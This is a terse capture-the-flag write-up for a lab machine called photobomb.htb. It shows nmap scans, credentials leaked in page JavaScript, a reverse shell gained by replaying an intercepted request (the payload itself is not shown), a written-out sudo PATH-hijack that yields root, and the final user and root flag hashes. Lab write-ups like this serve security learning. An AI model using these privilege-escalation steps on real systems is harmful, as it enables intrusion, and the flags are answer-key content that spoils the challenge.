# Initial nmap scan

> sudo nmap -sV -sC 10.10.11.182

Starting Nmap 7.91 ( https://nmap.org ) at 2022-11-05 21:54 EDT
Nmap scan report for 10.10.11.182
Host is up (0.072s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.38 seconds

#### View page source for any relevant information

```
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```
##### Try this

```
Sinatra doesn’t know this ditty.
Try this: 
```

```
get '/--%20nmap%20-sU%20--script%20backorifice-brute%20%3Chost%3E%20--script-args%20backorifice-brute.ports=%3Cports%3E/%20-%20IllegalArgumentException%20Invalid%20uri%20'http:/photobomb.htb:80/--%20nmap%20-sU%20--script%20backorifice-brute%20%3Chost%3E%20--script-args%20backorifice-brute.ports=%3Cports%3E/'' do
  "Hello World"
end
```

### Google Fu finds a Nmap script for this

"https://nmap.org/nsedoc/scripts/backorifice-brute.html"

"We find the port open for that service by just scanning for that port"

```
Starting Nmap 7.91 ( https://nmap.org ) at 2022-11-06 17:17 EST
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up (0.15s latency).

PORT      STATE         SERVICE
31337/udp open|filtered BackOrifice

Nmap done: 1 IP address (1 host up) scanned in 1.83 seconds
```

> nmap -sU --script backorifice-brute http://photobomb.htb --script-args backorifice-brute.ports=31337

```
Starting Nmap 7.91 ( https://nmap.org ) at 2022-11-06 17:22 EST
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up (0.11s latency).
Not shown: 999 closed ports
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 1093.09 seconds
```

#### Lookup dhcpc vulnerabilties

"https://www.rapid7.com/db/modules/exploit/unix/dhcp/rhel_dhcp_client_command_injection/"

"NOTHING!"

"photobomb.htb/image/"

"http://photobomb.htb:4567/__sinatra__/404.png"


http://photobomb.htb/printer/ login sends username and passwords credentials in base64 format upon request


```
Starting Nmap 7.91 ( https://nmap.org ) at 2022-11-06 18:08 EST
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up (0.090s latency).                                                 
Not shown: 997 closed ports
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
20366/udp open|filtered unknown
41524/udp open|filtered unknown

```

Get a request from intercepting a large photo download on burpsuite
Ran dl_postreq.txt in a Burpsuite repeater with a NC listener for a reverse shell
Got user text

Then
sudo -l

echo bash > find
chmod +x find
sudo PATH=$PWD:$PATH /opt/cleanup.sh

And you got root!



user
cf7de1b97a97dc9f806c18854b5cb6e3

root
bca2c077dd8715dc584bec8e745b18f3